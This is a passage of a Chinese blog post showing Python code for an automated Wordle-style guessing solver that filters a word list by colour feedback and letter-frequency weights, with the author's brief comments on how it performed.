class="line"></span><br><span class="line">        <span class="comment"># 人类的一小步</span></span><br><span class="line">        <span class="attribute">site</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">for</span> color in s_:</span><br><span class="line">            <span class="attribute">if</span> &#x27;<span class="number">47</span>m&#x27; in color:  # 白色 : 在这个位置，这个字母不存在！</span><br><span class="line">                <span class="comment"># tmp = saves</span></span><br><span class="line">                <span class="comment"># 不在这个位置</span></span><br><span class="line">                <span class="attribute">del_word</span> = tmp[site - <span class="number">1</span>]  # <span class="string">&quot;s&quot;</span></span><br><span class="line">                <span class="attribute">data2</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> word in data:</span><br><span class="line">                    <span class="attribute">if</span> word[site - <span class="number">1</span>] != del_word:</span><br><span class="line">                        <span class="attribute">data2</span>.append(word)</span><br><span class="line">                <span class="attribute">data</span> = data<span class="number">2</span></span><br><span class="line">                <span class="attribute">print</span>(<span class="string">&quot;白色&quot;</span>, len(data))</span><br><span class="line"></span><br><span class="line">            <span class="attribute">elif</span> &#x27;<span class="number">43</span>m&#x27; in color:  # 黄色 : 字母存在，但不是这个位置</span><br><span class="line">                <span class="comment"># 存在</span></span><br><span class="line">                <span class="attribute">data1</span> = data</span><br><span class="line">                <span class="attribute">data</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> i in data<span class="number">1</span>:</span><br><span class="line">                    <span class="attribute">if</span> tmp[site - <span class="number">1</span>] in i:</span><br><span class="line">                        <span class="attribute">data</span>.append(i)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 不在这个位置</span></span><br><span class="line">                <span class="attribute">del_word</span> = tmp[site - <span class="number">1</span>]  # <span class="string">&quot;s&quot;</span></span><br><span class="line">                <span class="attribute">data2</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> word in data:</span><br><span class="line">                    <span class="attribute">if</span> word[site - <span class="number">1</span>] != del_word:</span><br><span class="line">                        <span class="attribute">data2</span>.append(word)</span><br><span class="line">                <span class="attribute">data</span> = data<span class="number">2</span></span><br><span class="line">                <span class="attribute">print</span>(<span class="string">&quot;黄色&quot;</span>, len(data))</span><br><span class="line"></span><br><span class="line">            <span class="attribute">elif</span> &#x27;<span class="number">42</span>m&#x27; in color:  # 绿色 : 字母存在 且 是在这个位置</span><br><span class="line">                <span class="comment"># 存在且位置正确</span></span><br><span class="line">                <span class="attribute">word</span> = tmp[site - <span class="number">1</span>]  # d</span><br><span class="line">                <span class="attribute">data2</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> i in data:</span><br><span class="line">                    <span class="attribute">if</span> i[int(site) - <span class="number">1</span>] == word:</span><br><span class="line">                        <span class="attribute">data2</span>.append(i)</span><br><span class="line">                <span class="attribute">data</span> = data<span class="number">2</span></span><br><span class="line">                <span class="attribute">print</span>(<span class="string">&quot;绿色&quot;</span>, len(data))</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">print</span>(&#x27;啥也不是&#x27;, color)</span><br><span class="line">            <span class="attribute">site</span> += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结局是：选最简单但不无脑的模式1（6次机会），不能稳定完成 ： （</p><h3 id="改进后"><a href="#改进后" class="headerlink" title="改进后"></a>改进后</h3><p>忘记了改了什么，大概是逻辑细节修补一下？</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求出现总次数、排序</span></span><br><span class="line"><span class="attribute">def</span> sum_l(site):</span><br><span class="line">    <span class="attribute">global</span> data</span><br><span class="line">    <span class="attribute">dict_letter</span> = &#123;&#125;</span><br><span class="line">    <span class="attribute">for</span> word in data:</span><br><span class="line">        <span class="attribute">if</span> word[site - <span class="number">1</span>] in dict_letter:</span><br><span class="line">            <span class="attribute">dict_letter</span>[word[site - <span class="number">1</span>]] += <span class="number">1</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">dict_letter</span>[word[site - <span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">    <span class="attribute">dict_letter</span>.items()  # 得到: dict_items([(&#x27;a&#x27;, <span class="number">1</span>), (&#x27;c&#x27;, <span class="number">3</span>), (&#x27;b&#x27;, <span class="number">2</span>)])</span><br><span class="line">    <span class="attribute">L</span> = list(dict_letter.items())  # 得到列表: L=[(&#x27;a&#x27;, <span class="number">1</span>), (&#x27;c&#x27;, <span class="number">3</span>), (&#x27;b&#x27;, <span class="number">2</span>)]</span><br><span class="line">    <span class="attribute">L</span>.sort(key=lambda x: x[<span class="number">1</span>], reverse=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">    <span class="attribute">return</span> L</span><br><span class="line">    <span class="comment"># x代表从L中遍历出的一个元组</span></span><br><span class="line">    <span class="comment"># 得到:  [(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计推荐</span></span><br><span class="line"><span class="attribute">def</span> get():</span><br><span class="line">    <span class="attribute">L1</span> = sum_l(<span class="number">1</span>)</span><br><span class="line">    <span class="attribute">L2</span> = sum_l(<span class="number">2</span>)</span><br><span class="line">    <span class="attribute">L3</span> = sum_l(<span class="number">3</span>)</span><br><span class="line">    <span class="attribute">L4</span> = sum_l(<span class="number">4</span>)</span><br><span class="line">    <span class="attribute">L5</span> = sum_l(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attribute">L_list</span> =<span class="meta"> [L1, L2, L3, L4, L5]</span></span><br><span class="line">    <span class="attribute">quanzhong</span> = &#123;&#125;</span><br><span class="line">    <span class="attribute">site1</span> = <span class="number">1</span></span><br><span class="line">    <span class="attribute">for</span> L in L_list:</span><br><span class="line">        <span class="attribute">if</span> len(L) == <span class="number">1</span>:  # 此位已确定，不予排序</span><br><span class="line">            <span class="attribute">pass</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">quanzhong</span>[L[-<span class="number">1</span>][<span class="number">0</span>] + str(site<span class="number">1</span>)] = L[-<span class="number">1</span>][-<span class="number">1</span>]  # 把每一位最大权重的字母加到列表中like： &#123;<span class="string">&quot;c1&quot;</span>: <span class="number">3</span>&#125; ；  <span class="string">&quot;1&quot;</span> 指代第一位</span><br><span class="line">        <span class="attribute">site1</span> += <span class="number">1</span></span><br><span class="line">    <span class="attribute">Q</span> = list(quanzhong.items())</span><br><span class="line">    <span class="attribute">Q</span>.sort(key=lambda x: x[<span class="number">1</span>], reverse=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">    <span class="attribute">print</span>(<span class="string">&quot;Q&quot;</span>, Q)</span><br><span class="line">    <span class="comment"># 得到列表: Q=[(&#x27;a2&#x27;, 1), (&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4)]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 位权最高</span></span><br><span class="line">    <span class="attribute">data_01</span> =<span class="meta"> []</span></span><br><span class="line">    <span class="attribute">for</span> each_word in data:</span><br><span class="line">        <span class="attribute">if</span> each_word[int(Q[-<span class="number">1</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">            <span class="attribute">data_01</span>.append(each_word)</span><br><span class="line">    <span class="attribute">print</span>(data_<span class="number">01</span>)</span><br><span class="line">    <span class="attribute">if</span> len(Q) == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># [(&#x27;b1&#x27;, 4)]</span></span><br><span class="line">        <span class="attribute">return</span> data_<span class="number">01</span>[-<span class="number">1</span>]</span><br><span class="line">    <span class="attribute">elif</span> len(Q) == <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># [(&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4)]]</span></span><br><span class="line">        <span class="attribute">data_02</span> =<span class="meta"> []</span></span><br><span class="line">        <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">            <span class="attribute">if</span> each_word[int(Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">pass</span></span><br><span class="line">        <span class="attribute">if</span> len(data_<span class="number">02</span>) != <span class="number">0</span>:</span><br><span class="line">            <span class="attribute">return</span> data_<span class="number">02</span>[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">return</span> data_<span class="number">01</span>[-<span class="number">1</span>]</span><br><span class="line">    <span class="attribute">elif</span> len(Q) == <span class="number">3</span>:</span><br><span class="line">        <span class="comment"># [(&#x27;a2&#x27;, 1), (&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4)]</span></span><br><span class="line">        <span class="attribute">data_02</span> =<span class="meta"> []</span></span><br><span class="line">        <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">            <span class="attribute">if</span> each_word[int(Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">if</span> len(data_<span class="number">02</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">02</span>) != <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">02</span>[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">01</span>[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">return</span> data_<span class="number">02</span>[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">return</span> data_<span class="number">03</span>[-<span class="number">1</span>]</span><br><span class="line">    <span class="attribute">elif</span> len(Q) == <span class="number">4</span>:</span><br><span class="line">        <span class="attribute">data_02</span> =<span class="meta"> []</span></span><br><span class="line">        <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">            <span class="attribute">if</span> each_word[int(Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">pass</span></span><br><span class="line">        <span class="attribute">if</span> len(data_<span class="number">02</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each in data_<span class="number">01</span>:</span><br><span class="line">                <span class="attribute">if</span> each[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">01</span>[-<span class="number">1</span>]</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">04</span>[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">03</span>[-<span class="number">1</span>]</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">04</span>[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">02</span>[-<span class="number">1</span>]</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">04</span>[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">03</span>[-<span class="number">1</span>]</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">return</span> data_<span class="number">04</span>[-<span class="number">1</span>]</span><br><span class="line">    <span class="attribute">elif</span> len(Q) == <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># [(&#x27;a2&#x27;, 1), (&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4), (&#x27;z4&#x27;, 5), (w4&quot;, 8)]</span></span><br><span class="line">        <span class="attribute">data_02</span> =<span class="meta"> []</span></span><br><span class="line">        <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">            <span class="attribute">if</span> each_word[int(Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                <span class="attribute">data_02</span>.append(each_word)</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">pass</span></span><br><span class="line">        <span class="attribute">if</span> len(data_<span class="number">02</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">01</span>[-<span class="number">1</span>]</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span>[-<span class="number">1</span>]</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">04</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span 